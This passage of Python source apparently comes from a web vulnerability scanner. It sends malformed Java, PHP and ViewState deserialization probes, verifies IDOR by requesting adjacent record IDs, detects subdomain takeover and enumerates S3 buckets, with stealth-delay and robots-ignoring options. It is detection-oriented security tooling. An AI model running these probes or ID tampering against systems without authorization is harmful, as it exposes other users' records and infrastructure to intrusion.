) -> None:
    """
    Passive serialization format detection. Runs unconditionally on every crawled
    response — does NOT require --active-probes. Flags MEDIUM (or INFO for ViewState
    presence alone) when a known serialized-data indicator is found in the response
    body, Content-Type header, or Set-Cookie header.

    Java:   AC ED 00 05 magic bytes | 'rO0AB' Base64 prefix | Content-Type header
    PHP:    O:\\d+: / a:\\d+: / s:\\d+: patterns in body or Set-Cookie
    Pickle: 80 02–05 magic bytes | Content-Type header
    Ruby:   04 08 magic bytes
    .NET:   __VIEWSTATE hidden field present (INFO — active check may upgrade)
    """
    if not is_in_scope(page_url):
        return
    if is_third_party_cdn(urlparse(page_url).netloc):
        return

    hdrs       = {k.lower(): v for k, v in response_headers.items()} if response_headers else {}
    ct         = hdrs.get("content-type", "")
    set_cookie = hdrs.get("set-cookie", "")
    body_b     = _to_bytes(html_content)
    body_s     = body_b.decode("utf-8", errors="replace")

    findings = []   # (format_label, evidence_str, severity)

    # ── Java serialization ────────────────────────────────────────────────────
    if "application/x-java-serialized-object" in ct.lower():
        findings.append(("Java serialization",
                          "Content-Type: application/x-java-serialized-object", "MEDIUM"))
    elif body_b[:4] == _JAVA_SERIAL_MAGIC:
        findings.append(("Java serialization",
                          "Response body starts with Java magic bytes AC ED 00 05", "MEDIUM"))
    elif _JAVA_SERIAL_B64_PREFIX in body_s or _JAVA_SERIAL_B64_PREFIX in set_cookie:
        where = "Set-Cookie" if _JAVA_SERIAL_B64_PREFIX in set_cookie else "response body"
        findings.append(("Java serialization",
                          f"Base64 Java serialization prefix 'rO0AB' in {where}", "MEDIUM"))

    # ── PHP serialization ─────────────────────────────────────────────────────
    for src_label, src_text in (("response body", body_s), ("Set-Cookie", set_cookie)):
        m = _PHP_SERIAL_RE.search(src_text)
        if m:
            snippet = src_text[max(0, m.start() - 10):m.end() + 60].strip()
            findings.append(("PHP serialization",
                              f"PHP serialized data pattern in {src_label}: {snippet!r}", "MEDIUM"))
            break

    # ── Python pickle ─────────────────────────────────────────────────────────
    if "application/python-pickle" in ct.lower():
        findings.append(("Python pickle", "Content-Type: application/python-pickle", "MEDIUM"))
    elif any(body_b.startswith(m) for m in _PICKLE_MAGICS):
        findings.append(("Python pickle",
                          f"Response body starts with pickle magic {body_b[:2].hex().upper()}", "MEDIUM"))

    # ── Ruby Marshal ──────────────────────────────────────────────────────────
    if body_b[:2] == _RUBY_MARSHAL_MAGIC:
        findings.append(("Ruby Marshal",
                          "Response body starts with Ruby Marshal magic bytes 04 08", "MEDIUM"))

    # ── .NET ViewState presence ───────────────────────────────────────────────
    vm = _VIEWSTATE_RE.search(body_s)
    if vm:
        vs_val = (vm.group(1) or vm.group(2) or "")[:40]
        findings.append(("NET ViewState",
                          f"__VIEWSTATE hidden field present (prefix: {vs_val!r}…)", "INFO"))

    for fmt_label, evidence, sev in findings:
        key = (page_url, fmt_label)
        if key in _deserial_passive_seen:
            continue
        _deserial_passive_seen.add(key)
        alert(
            f"SERIALIZED DATA FORMAT DETECTED: {fmt_label}",
            sev,
            page_url,
            f"{fmt_label} serialized data format detected — endpoint may accept/return "
            f"serialized objects. Evidence: {evidence}. "
            f"Manual verification required to confirm exploitability.",
        )
        print(timestamp() + f" [!] Serialized format ({fmt_label}) detected at {page_url}")


def check_insecure_deserialization(
    page_url: str,
    html_content,
    response_headers: dict,
) -> None:
    """
    Active insecure deserialization detection. Requires --active-probes.

    Java:
      POST a malformed serialization stream (magic header + truncated class
      descriptor) to the endpoint. Triggers StreamCorruptedException or
      InvalidClassException — confirms deserialization without loading any class.

    PHP:
      POST a syntactically incomplete PHP serialized string to the page. Checks
      for PHP unserialize() warning/error strings in the response.

    .NET ViewState MAC:
      For each form containing __VIEWSTATE, flip one character, resubmit via POST
      to the form action. If the server accepts the tampered ViewState without a
      MAC validation error → MAC protection is disabled → HIGH.

    Detection-only: no gadget chains, no class loading, no code execution.
    10-second timeout per probe. Deduplicates per (endpoint, format) pair.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    body_b = _to_bytes(html_content)
    body_s = body_b.decode("utf-8", errors="replace")
    hdrs   = {k.lower(): v for k, v in response_headers.items()} if response_headers else {}
    ct     = hdrs.get("content-type", "")
    sc     = hdrs.get("set-cookie", "")

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected]"

    # ── Java active probe ─────────────────────────────────────────────────────
    is_java = (
        "application/x-java-serialized-object" in ct.lower()
        or body_b[:4] == _JAVA_SERIAL_MAGIC
        or _JAVA_SERIAL_B64_PREFIX in body_s
        or _JAVA_SERIAL_B64_PREFIX in sc
    )
    if is_java:
        akey = (page_url, "Java")
        if akey not in _deserial_active_tested:
            _deserial_active_tested.add(akey)
            # Malformed stream: magic + class-descriptor start for non-existent class.
            # StreamCorruptedException fires before any class is resolved — safe.
            java_probe = (
                _JAVA_SERIAL_MAGIC
                + b"\x73\x72\x00\x09NuScrape"   # TC_OBJECT TC_CLASSDESC len=9 "NuScrape"
                + b"\x00" * 8                    # serialVersionUID placeholder
                + b"\x02\x00\x00"                # flags + field count = 0
            )
            try:
                stealth_delay(domain)
                print(timestamp() + f" Java deserial active probe: {page_url}")
                resp = _get_session().post(
                    page_url,
                    data=java_probe,
                    headers={**create_request_header(),
                              "Content-Type": "application/x-java-serialized-object"},
                    timeout=10,
                    allow_redirects=True,
                    verify=False,
                )
                body = resp.text or ""
                for err in _JAVA_DESERIAL_ERRORS:
                    if err in body:
                        idx     = body.find(err)
                        snippet = body[max(0, idx - 30):idx + 120].strip()
                        alert(
                            "INSECURE DESERIALIZATION: Java (CONFIRMED)",
                            "HIGH",
                            page_url,
                            f"Endpoint processed Java serialized input and reflected error "
                            f"'{err}' — confirms server-side Java ObjectInputStream usage. "
                            f"Snippet: {snippet!r}{waf_note}",
                        )
                        break
            except Exception:
                pass

    # ── PHP active probe ──────────────────────────────────────────────────────
    is_php = bool(_PHP_SERIAL_RE.search(body_s) or _PHP_SERIAL_RE.search(sc))
    if is_php:
        akey = (page_url, "PHP")
        if akey not in _deserial_active_tested:
            _deserial_active_tested.add(akey)
            # Intentionally malformed — truncated object body triggers unserialize() error
            php_probe = 'O:9:"NuScrape":1:{'
            try:
                stealth_delay(domain)
                print(timestamp() + f" PHP deserial active probe: {page_url}")
                resp = _get_session().post(
                    page_url,
                    data={"data": php_probe},
                    headers=create_request_header(),
                    timeout=10,
                    allow_redirects=True,
                )
                body = resp.text or ""
                for err in _PHP_DESERIAL_ERRORS:
                    if err.lower() in body.lower():
                        idx     = body.lower().find(err.lower())
                        snippet = body[max(0, idx - 30):idx + 120].strip()
                        alert(
                            "INSECURE DESERIALIZATION: PHP (CONFIRMED)",
                            "HIGH",
                            page_url,
                            f"Endpoint reflected PHP unserialize error '{err}' — "
                            f"confirms server-side unserialize() call on user input. "
                            f"Snippet: {snippet!r}{waf_note}",
                        )
                        break
            except Exception:
                pass

    # ── .NET ViewState MAC validation check ───────────────────────────────────
    try:
        soup = BeautifulSoup(body_s, "lxml")
    except Exception:
        soup = None

    if soup:
        for form in soup.find_all("form"):
            vs_input = form.find("input", attrs={"name": "__VIEWSTATE"})
            if vs_input is None:
                continue
            vs_val = vs_input.get("value", "")
            if not vs_val or not _VIEWSTATE_B64_RE.match(vs_val):
                continue

            action     = form.get("action") or page_url
            action_url = urljoin(page_url, action)
            akey       = (action_url, "ViewState")
            if akey in _deserial_active_tested:
                continue
            _deserial_active_tested.add(akey)

            # Tamper: flip last Base64 character (preserves length, breaks MAC)
            modified_vs = vs_val[:-1] + ("A" if vs_val[-1] != "A" else "B")

            # Build a minimal form submission with all hidden fields + tampered ViewState
            form_data = {"__VIEWSTATE": modified_vs}
            for inp in form.find_all("input"):
                n = inp.get("name", "")
                if n and n != "__VIEWSTATE":
                    form_data[n] = inp.get("value", "")

            try:
                stealth_delay(domain)
                print(timestamp() + f" ViewState MAC probe: {action_url}")
                resp = _get_session().post(
                    action_url,
                    data=form_data,
                    headers=create_request_header(),
                    timeout=10,
                    allow_redirects=True,
                )
                body = resp.text or ""
                mac_error_sigs = [
                    "invalid viewstate",
                    "validation of viewstate mac",
                    "the state information is invalid",
                    "mac failed",
                    "viewstate",
                ]
                rejected = any(sig in body.lower() for sig in mac_error_sigs)
                if not rejected and resp.status_code == 200:
                    alert(
                        "INSECURE DESERIALIZATION: .NET ViewState MAC Disabled",
                        "HIGH",
                        action_url,
                        f"Tampered __VIEWSTATE accepted without MAC validation error — "
                        f"ViewState MAC protection appears disabled. "
                        f"Original prefix: {vs_val[:20]!r}… "
                        f"Tampered prefix: {modified_vs[:20]!r}…{waf_note}",
                    )
                else:
                    print(timestamp() + f" ViewState MAC validation active on {action_url}")
            except Exception:
                pass


# ─────────────────────────────────────────────
# IDOR parameter detection (with auto-verification)
# ─────────────────────────────────────────────

IDOR_PARAM_NAMES = {
    "id", "user_id", "userId", "account_id", "accountId",
    "order_id", "orderId", "invoice_id", "invoiceId",
    "file_id", "fileId", "doc_id", "docId", "document_id",
    "ticket_id", "ticketId", "report_id", "reportId",
    "customer_id", "customerId", "profile_id", "profileId",
    "message_id", "messageId", "post_id", "postId",
    "record_id", "recordId", "item_id", "itemId",
    "ref", "reference", "uid", "guid", "uuid",
    "pid", "rid", "oid", "vid", "sid",
}

# REST path regex — numeric (3+ digits) or UUID
IDOR_PATH_REGEX = re.compile(
    r'/(?:api|v\d+)?/?\w+/(\d{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$)',
    re.I
)

# Path segments that are never user-data IDOR targets
IDOR_PATH_BLOCKLIST = re.compile(
    r'/(?:css|js|assets|images|img|fonts|static|media|generated|optimized|'
    r'cache|dist|build|public|vendor|lib|libs|node_modules|'
    r'uploads|upload|files|file|attachments|attachment|downloads|download|'
    r'storage|content|resources|resource|archive|archives|'
    r'answers|articles|help|faq|kb|knowledge|docs|documentation|'
    r'blog|news|press|events|about|contact|legal|privacy|terms|'
    r'wp-content|wp-includes|themes|plugins)/',
    re.I
)

# File extensions that are never IDOR targets
IDOR_EXT_BLOCKLIST = re.compile(
    r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|'
    r'pdf|zip|tar|gz|xml|json|txt|md|csv|'
    r'mp4|mp3|mov|avi|mkv|webm|ogg|wav|flac|'
    r'doc|docx|xls|xlsx|ppt|pptx|'
    r'psd|ai|eps|tiff|bmp|raw)(\?|$)',
    re.I
)

_idor_reported  = set()   # (domain, endpoint_pattern, param) already verified+reported
_idor_tested    = set()   # (endpoint, param) already run verification on

def _idor_response_fingerprint(resp):
    """
    Return a tuple that characterises a response for diffing:
    (status_code, content_length, has_auth_redirect, body_sample)
    body_sample is the first 4000 chars of the response, used for
    similarity comparison via difflib.SequenceMatcher.
    """
    if resp is None:
        return None
    status = resp.status_code
    size   = len(resp.content)
    auth_redirect = any(kw in resp.url for kw in
                        ("login", "signin", "sign-in", "auth", "sso", "session"))
    body_sample = resp.text[:4000] if resp.text else ""
    return (status, size, auth_redirect, body_sample)

def _idor_requires_auth(url):
    """
    Fetch URL without any session cookies. If we get a redirect to login
    or a 401/403, the endpoint is auth-gated — worth IDOR testing.
    Returns (requires_auth: bool, response_fingerprint)
    """
    try:
        # Use a clean session with no cookies
        stealth_delay(urlparse(url).netloc)
        resp = _get_session().get(
            url,
            headers=create_request_header(),
            cookies={},
            timeout=6,
            allow_redirects=True,
        )
        fp = _idor_response_fingerprint(resp)
        if resp.status_code in (401, 403):
            return True, fp
        # Redirected to login page
        if any(kw in resp.url for kw in ("login", "signin", "sign-in", "auth", "sso")):
            return True, fp
        # Response contains login form markers
        if any(kw in resp.text.lower() for kw in
               ("login-form", "sign in", "please log in", "you must be logged")):
            return True, fp
        return False, fp
    except Exception:
        return False, None

def _idor_substitute_id(url, param, original_id, kind):
    """
    Return a modified URL with the ID incremented/decremented by 1.
    For query params: replace param value.
    For path IDs: replace the numeric segment.
    Returns list of (label, test_url) tuples.
    """
    variants = []
    try:
        if kind == "query_param":
            parsed = urlparse(url)
            # Build ±1 variants
            for delta, label in [(1, "id+1"), (-1, "id-1")]:
                new_id = str(int(original_id) + delta)
                new_query = "&".join(
                    f"{k}={new_id}" if k == param else f"{k}={v}"
                    for k, v in (p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
                )
                variants.append((label, parsed._replace(query=new_query).geturl()))
        elif kind == "rest_path":
            # Replace numeric ID in path
            for delta, label in [(1, "id+1"), (-1, "id-1")]:
                new_id = str(int(original_id) + delta)
                new_url = re.sub(
                    r'(/)(' + re.escape(original_id) + r')(/|$)',
                    lambda m: m.group(1) + new_id + m.group(3),
                    url, count=1
                )
                if new_url != url:
                    variants.append((label, new_url))
    except Exception:
        pass
    return variants

def verify_idor_candidate(base_url, endpoint, param, value, kind):
    """
    Full 5-stage IDOR verification pipeline:

    1. Path blocklist  — skip CSS/JS/assets/public-content paths
    2. Extension check — skip static file extensions
    3. Auth-gate check — skip endpoints accessible without a session
    4. ID substitution — fetch ID±1, compare response fingerprints
    5. Response diff   — only alert if different IDs return meaningfully
                         different responses (proving per-object data)

    Returns True if confirmed worth alerting, False otherwise.
    """
    parsed = urlparse(endpoint)
    path   = parsed.path

    # ── Stage 1: Path blocklist ───────────────────────────────
    if IDOR_PATH_BLOCKLIST.search(path):
        return False

    # ── Stage 2: Extension blocklist ─────────────────────────
    if IDOR_EXT_BLOCKLIST.search(path + "?" + parsed.query):
        return False

    # ── Stage 3: Auth-gate check ──────────────────────────────
    # Build the real URL with the original ID value
    if kind == "query_param":
        real_url = endpoint + "?" + param + "=" + value
    else:
        real_url = re.sub(r'\{id\}', value, endpoint)

    requires_auth, real_fp = _idor_requires_auth(real_url)
    if not requires_auth:
        return False   # Public endpoint — not interesting

    # ── Stage 4 & 5: ID substitution + response diff ─────────
    variants = _idor_substitute_id(real_url, param, value, kind)
    if not variants:
        # Can't generate variants (UUID or non-numeric) — log as unverified candidate
        return True  # Still worth human review if auth-gated

    fingerprints = []
    for label, test_url in variants:
        try:
            stealth_delay(urlparse(test_url).netloc)
            resp = _get_session().get(
                test_url,
                headers=create_request_header(),
                cookies={},
                timeout=6,
                allow_redirects=True,
            )
            fingerprints.append((label, _idor_response_fingerprint(resp)))
        except Exception:
            continue

    if not fingerprints:
        return False

    # Compare real response to variants using text similarity.
    # If responses are >85% similar across all variants, the endpoint returns
    # the same content regardless of ID — not per-object data (not IDOR).
    # If responses differ meaningfully (similarity <85%) — likely real IDOR.
    import difflib as _difflib
    real_status, _, _, real_body = real_fp
    all_404 = all(fp[0] == 404 for _, fp in fingerprints if fp)
    if all_404:
        return False   # Adjacent IDs don't exist — sparse ID space, low risk

    similarities = []
    for _, fp in fingerprints:
        if not fp:
            continue
        variant_body = fp[3]
        ratio = _difflib.SequenceMatcher(None, real_body, variant_body).quick_ratio()
        similarities.append(ratio)

    if not similarities:
        return False

    # All variants are >85% similar to the real response — same template, no per-object data
    if all(r > 0.85 for r in similarities):
        return False

    return True   # Responses differ meaningfully per ID on auth-gated endpoint — real candidate


# Social media platforms use public numeric/UUID identifiers by design.
# IDOR checks on these domains produce only noise.
_IDOR_SKIP_DOMAINS = {
    "facebook.com", "instagram.com", "twitter.com", "x.com",
    "youtube.com", "linkedin.com", "tiktok.com", "pinterest.com", "reddit.com",
}

def check_idor_candidates(page_url, html_content):
    """
    Collect IDOR candidates from page links, then run full verification
    pipeline on each unique (endpoint, param) pair before alerting.
    Alerts only on confirmed auth-gated endpoints with per-object data.
    """
    domain = urlparse(page_url).netloc
    base_domain = domain.lstrip("www.")
    if any(base_domain == d or base_domain.endswith("." + d) for d in _IDOR_SKIP_DOMAINS):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="replace")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    candidates = set()
    all_urls   = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    # ── Collect query param candidates ────────────────────────
    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if not parsed.query:
                continue
            for pair in parsed.query.split("&"):
                if "=" not in pair:
                    continue
                k, v = pair.split("=", 1)
                if k.lower() not in {p.lower() for p in IDOR_PARAM_NAMES}:
                    continue
                if re.match(r'^\d{2,}$', v) or re.match(
                    r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', v, re.I
                ):
                    endpoint = parsed.scheme + "://" + parsed.netloc + parsed.path
                    candidates.add((endpoint, k, v, "query_param"))
        except Exception:
            continue

    # ── Collect REST path candidates ──────────────────────────
    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            for match in IDOR_PATH_REGEX.finditer(parsed.path):
                id_val  = match.group(1)
                pattern = IDOR_PATH_REGEX.sub(
                    lambda m: m.group(0).replace(m.group(1), "{id}"), parsed.path
                )
                base    = parsed.scheme + "://" + parsed.netloc if parsed.scheme else \
                          urlparse(page_url).scheme + "://" + urlparse(page_url).netloc
                endpoint = base + pattern
                candidates.add((endpoint, "path_id", id_val, "rest_path"))
        except Exception:
            continue

    # ── Verify each candidate before alerting ─────────────────
    for endpoint, param, value, kind in candidates:
        if not is_in_scope(endpoint):
            continue
        test_key   = (endpoint, param)
        report_key = (domain, endpoint, param)

        if test_key in _idor_tested or report_key in _idor_reported:
            continue
        _idor_tested.add(test_key)

        print(timestamp() + f" IDOR verify: {endpoint} param={param} value={value}")
        confirmed = verify_idor_candidate(endpoint, endpoint, param, value, kind)

        if confirmed:
            _idor_reported.add(report_key)
            detail = f"[{kind}] Verified auth-gated endpoint with per-object data. " \
                     f"Param '{param}' = '{value}'. Modify ID to access other users' records."
            write_to_js_database(page_url, endpoint, "idor_candidate", detail)
            alert(
                "IDOR CANDIDATE — VERIFIED",
                "HIGH",
                endpoint,
                detail + f" Source: {page_url}"
            )
            print(timestamp() + f" [!!] IDOR verified: {endpoint} param={param}")
        else:
            print(timestamp() + f" IDOR dismissed (not auth-gated or no per-object diff): {endpoint}")



# CNAME fingerprints: service name → (cname_patterns, body_fingerprints, confirm_required)
# confirm_required=True  → body fingerprint must match before HIGH alert;
#                          "no response" only generates MEDIUM (used for services
#                          whose infrastructure is hard to claim externally, e.g.
#                          Azure cloudapp.net internal load balancers).
# confirm_required=False → dangling CNAME with no response is sufficient for HIGH.
TAKEOVER_SIGNATURES = {
    "github-pages":      (["github.io"],                  ["There isn't a GitHub Pages site here",
                                                            "For root URLs (like http://example.com/) you must provide an index.html"],
                                                           False),
    "heroku":            (["herokudns.com", "herokussl.com", "herokuapp.com"],
                                                          ["No such app", "herokucdn.com/error-pages/no-such-app"],
                                                           False),
    "aws-s3":            (["s3.amazonaws.com", "s3-website"],
                                                          ["NoSuchBucket", "The specified bucket does not exist"],
                                                           False),
    # Azure App Service public endpoints (azurewebsites.net) — moderate confidence
    "azure-app":         (["azurewebsites.net", "azure-api.net"],
                                                          ["404 Web Site not found", "This web app has been stopped"],
                                                           False),
    # Azure internal load balancer (waws-prod-*.cloudapp.net) — body confirmation
    # required; these are Azure-internal infrastructure, not publicly claimable,
    # so a dangling CNAME with no response is very common and low-signal.
    "azure-scm":         (["cloudapp.net"],               ["404 Web Site not found", "This web app has been stopped"],
                                                           True),
    # AWS Elastic Beanstalk — internal DNS, require body confirm
    "aws-elastic-beanstalk": (["elasticbeanstalk.com"],   ["NXDOMAIN", "404 Not Found"],
                                                           True),
    "fastly":            (["fastly.net"],                 ["Fastly error: unknown domain"],
                                                           False),
    "shopify":           (["myshopify.com"],              ["Sorry, this shop is currently unavailable"],
                                                           False),
    "squarespace":       (["squarespace.com"],            ["No Such Account"],
                                                           False),
    "tumblr":            (["domains.tumblr.com"],         ["There's nothing here."],
                                                           False),
    "wordpress":         (["wordpress.com"],              ["Do you want to register"],
                                                           False),
    "ghost":             (["ghost.io"],                   ["The thing you were looking for is no longer here"],
                                                           False),
    "helpscout":         (["helpscoutdocs.com"],          ["No settings were found for this company"],
                                                           False),
    "zendesk":           (["zendesk.com"],                ["Help Center Closed", "Oops, this help center no longer exists"],
                                                           False),
    "uservoice":         (["uservoice.com"],              ["This UserVoice subdomain is currently available"],
                                                           False),
    "pingdom":           (["stats.pingdom.com"],          ["This public report page has not been activated"],
                                                           False),
    "statuspage":        (["statuspage.io"],              ["You are being redirected"],
                                                           False),
    "surge":             (["surge.sh"],                   ["project not found"],
                                                           False),
    "netlify":           (["netlify.app", "netlify.com"], ["Not Found - Request ID"],
                                                           False),
    "readme":            (["readme.io", "readmessl.com"], ["Project doesnt exist... yet!"],
                                                           False),
    "intercom":          (["custom.intercom.help"],       ["This page is reserved for artistic dogs"],
                                                           False),
    "webflow":           (["webflow.io"],                 ["The page you are looking for doesn't exist"],
                                                           False),
    "fly.io":            (["fly.dev"],                    ["404 Not Found"],
                                                           False),
}

_takeover_checked = set()

def check_subdomain_takeover(fqdn):
    """
    Check if a subdomain is vulnerable to takeover by:
    1. Resolving its CNAME chain
    2. Matching the CNAME target against known takeover-vulnerable services
    3. Fetching the page and confirming an unclaimed/error fingerprint

    Only alerts when BOTH the CNAME pattern AND the body fingerprint match,
    to avoid false positives on services that return generic 404s.
    """
    if fqdn in _takeover_checked:
        return
    _takeover_checked.add(fqdn)

    try:
        # Resolve CNAME chain
        cname_target = None
        try:
            answers = dns.resolver.resolve(fqdn, "CNAME")
            cname_target = str(answers[0].target).rstrip(".").lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.DNSException):
            return  # No CNAME — not vulnerable via this vector

        if not cname_target:
            return

        # Match against takeover signatures
        for service, (cname_patterns, body_fingerprints, confirm_required) in TAKEOVER_SIGNATURES.items():
            if not any(p in cname_target for p in cname_patterns):
                continue

            # CNAME matches a vulnerable service — now confirm with body
            resp = safe_get("https://" + fqdn, timeout=6)
            if not resp:
                resp = safe_get("http://" + fqdn, timeout=6)
            if not resp:
                if confirm_required:
                    # Infrastructure not publicly claimable (e.g. Azure cloudapp.net
                    # internal LB, AWS EB internal DNS) — dangling CNAME with no
                    # response is very common noise, downgrade to MEDIUM.
                    alert(
                        "SUBDOMAIN TAKEOVER — VERIFY MANUALLY",
                        "MEDIUM",
                        fqdn,
                        f"CNAME → {cname_target} ({service}) — no HTTP response. "
                        f"Verify whether {cname_target} is claimable (confirm_required service)."
                    )
                else:
                    alert(
                        "POTENTIAL SUBDOMAIN TAKEOVER",
                        "HIGH",
                        fqdn,
                        f"CNAME → {cname_target} ({service}) — no HTTP response (possibly unclaimed)"
                    )
                return

            body = resp.text
            matched_fp = [fp for fp in body_fingerprints if fp.lower() in body.lower()]
            if matched_fp:
                if service == "github-pages":
                    # Require BOTH conditions before alerting:
                    # 1. github.com/<orgname> returns non-200 (org doesn't exist)
                    # 2. <orgname>.github.io returns 404
                    # If the org exists GitHub protects its namespace — suppress entirely.
                    org = cname_target.split(".")[0]  # "orgname" from "orgname.github.io"
                    org_exists = False
                    pages_404 = False
                    try:
                        org_resp = _get_session().get(
                            f"https://github.com/{org}",
                            headers=create_request_header(),
                            timeout=6,
                            allow_redirects=True,
                        )
                        org_exists = (org_resp.status_code == 200)
                    except Exception:
                        pass  # network error — treat org as unknown
                    if org_exists:
                        print(timestamp() + f" GitHub org '{org}' exists — suppressing Pages takeover FP for {fqdn}")
                        return
                    try:
                        pages_resp = _get_session().get(
                            f"https://{org}.github.io",
                            headers=create_request_header(),
                            timeout=6,
                            allow_redirects=True,
                        )
                        pages_404 = (pages_resp.status_code == 404)
                    except Exception:
                        pass  # network error — treat as unknown
                    if not pages_404:
                        print(timestamp() + f" {org}.github.io did not return 404 — suppressing Pages takeover FP for {fqdn}")
                        return

                alert(
                    "SUBDOMAIN TAKEOVER VULNERABLE",
                    "CRITICAL",
                    fqdn,
                    f"CNAME → {cname_target} ({service}) — unclaimed. Body contains: {matched_fp[0][:80]}"
                )
                print(timestamp() + f" [!!] SUBDOMAIN TAKEOVER: {fqdn} → {cname_target} ({service})")
            else:
                # CNAME points to a known-vulnerable service but body fingerprint
                # didn't match — could be a custom error page masking an unclaimed
                # site (as with cdn.getwemail.io / Netlify). Always alert so it
                # surfaces in the UI for manual verification.
                alert(
                    "SUBDOMAIN TAKEOVER — VERIFY MANUALLY",
                    "MEDIUM",
                    fqdn,
                    f"CNAME → {cname_target} ({service}) — body fingerprint unconfirmed. "
                    f"Check if {cname_target} is claimable on {service}."
                )
                print(timestamp() + f" Takeover candidate (unconfirmed): {fqdn} → {cname_target} ({service})")

    except Exception as e:
        print_error(f"check_subdomain_takeover failed for {fqdn}: {e}")


# ─────────────────────────────────────────────
# S3 bucket exposure detection
# ─────────────────────────────────────────────

# Regex patterns to extract S3 bucket names and URLs from page source / JS
S3_URL_PATTERNS = [
    # https://bucketname.s3.amazonaws.com
    re.compile(r'https?://([a-z0-9][a-z0-9\-]{2,62})\.s3[.\-](?:[\w\-]+\.)?amazonaws\.com', re.I),
    # https://s3.amazonaws.com/bucketname
    re.compile(r'https?://s3[.\-](?:[\w\-]+\.)?amazonaws\.com/([a-z0-9][a-z0-9\-]{2,62})', re.I),
    # https://s3.amazonaws.com/bucketname/
    re.compile(r's3://([a-z0-9][a-z0-9\-]{2,62})', re.I),
]

_s3_checked = set()

def check_s3_bucket(bucket_name, source_url=""):
    """
    Probe a discovered S3 bucket for public read or write access.
    Alerts on:
      - Public read (ListBucket returns XML)  → CRITICAL
      - 403 Forbidden (bucket exists, private) → INFORMATIONAL (logged only)
      - Public write (PUT succeeds)           → CRITICAL
    """
    if bucket_name in _s3_checked:
        return
    _s3_checked.add(bucket_name)

    bucket_url = f"https://{bucket_name}.s3.amazonaws.com/"
    try:
        resp = safe_get(bucket_url, timeout=6)
        if not resp:
            return

        if resp.status_code == 200 and "ListBucketResult" in resp.text:
            # Publicly listable — extract key count for context
            key_count = resp.text.count("<Key>")
            alert(
                "S3 BUCKET PUBLIC READ — LISTABLE",
                "CRITICAL",
                bucket_name,
                f"{bucket_url} — bucket listing exposed ({key_count} keys visible). Source: {source_url}"
            )
            print(timestamp() + f" [!!] S3 bucket listable: {bucket_name} ({key_count} keys)")

        elif resp.status_code == 200:
            # Bucket exists and responds publicly but listing is not enabled
            alert(
                "S3 BUCKET PUBLICLY ACCESSIBLE",
                "HIGH",
                bucket_name,
                f"{bucket_url} — bucket is publicly readable (HTTP 200, no listing). Source: {source_url}"
            )
            print(timestamp() + f" [!!] S3 bucket public (no listing): {bucket_name}")

        elif resp.status_code == 403:
            # Bucket exists but is private — log quietly, no alert
            print(timestamp() + f" S3 bucket exists (private/403): {bucket_name}")

        elif resp.status_code == 404 and "NoSuchBucket" in resp.text:
            # Bucket doesn't exist
            pass

    except Exception as e:
        print_error(f"check_s3_bucket failed for {bucket_name}: {e}")

def extract_and_probe_s3_buckets(content, source_url):
    """
    Extract S3 bucket names from page HTML or JS content and probe each one.
    Called from the crawler and JS analyser.
    """
    if not content:
        return
    text = content if isinstance(content, str) else content.decode("utf-8", errors="ignore")
    found = set()
    for pattern in S3_URL_PATTERNS:
        for match in pattern.finditer(text):
            bucket = match.group(1).lower().strip()
            if bucket and bucket not in found:
                found.add(bucket)
                print(timestamp() + f" S3 bucket reference found: {bucket} (from {source_url})")
                check_s3_bucket(bucket, source_url=source_url)

_s3_permutation_checked = set()  # root domains already permutation-scanned

def probe_s3_permutations(root_domain):
    """
    Generate common S3 bucket name patterns derived from the root domain
    and probe each one for public access.

    Only the bare name (no TLD) is used — e.g. "example" from "example.com".
    Skips domains already scanned this session. Adds a short delay between
    probes to avoid AWS throttling.
    """
    if root_domain in _s3_permutation_checked:
        return
    _s3_permutation_checked.add(root_domain)

    # Strip TLD: "example.com" → "example", "sub.example.co.uk" → "example"
    parts = root_domain.rstrip(".").split(".")
    name = parts[-2] if len(parts) >= 2 else parts[0]
    name = name.lower()

    candidates = [
        name,
        f"{name}-assets",
        f"{name}-backup",
        f"{name}-prod",
        f"{name}-staging",
        f"{name}-dev",
        f"{name}-static",
        f"{name}-media",
        f"{name}-uploads",
        f"{name}-logs",
        f"{name}-data",
        f"{name}-files",
        f"assets-{name}",
        f"backup-{name}",
        f"static-{name}",
    ]

    print(timestamp() + f" S3 permutation scan: {len(candidates)} candidates for '{name}' ({root_domain})")
    for bucket in candidates:
        time.sleep(0.5)
        check_s3_bucket(bucket, source_url=f"permutation scan of {root_domain}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NuScrape — web recon and vulnerability scanner")
    parser.add_argument("-D", "--Domain",              help="Start URL including http/https")
    parser.add_argument("--rate-min",  type=float,     default=1.0,  help="Min seconds between requests (default: 1.0)")
    parser.add_argument("--rate-max",  type=float,     default=3.0,  help="Max seconds between requests (default: 3.0)")
    parser.add_argument("--concurrency", type=int,     default=5,    help="Max concurrent requests (default: 5)")
    parser.add_argument("--same-domain-only", action="store_true",   help="Only crawl URLs on the starting domain")
    parser.add_argument("--resume",        action="store_true",  help="Resume from saved crawl state if available")
    parser.add_argument("--ignore-robots", action="store_true",  help="Ignore robots.txt restrictions")
    parser.add_argument("--playwright",    action="store_true",  help="Enable Playwright JS rendering for JS-heavy pages")
    parser.add_argument("--no-social",     action="store_true",  help="Skip crawling into social media domains (Facebook, Twitter, YouTube, etc.)")
    parser.add_argument("--no-skip-google-tracking", action="store_true",
                        help="Crawl Google Play and analytics URLs (default: skip them)")
    parser.add_argument("--stealth",        default="LOUD",       choices=["LOUD", "NORMAL", "GHOST"],
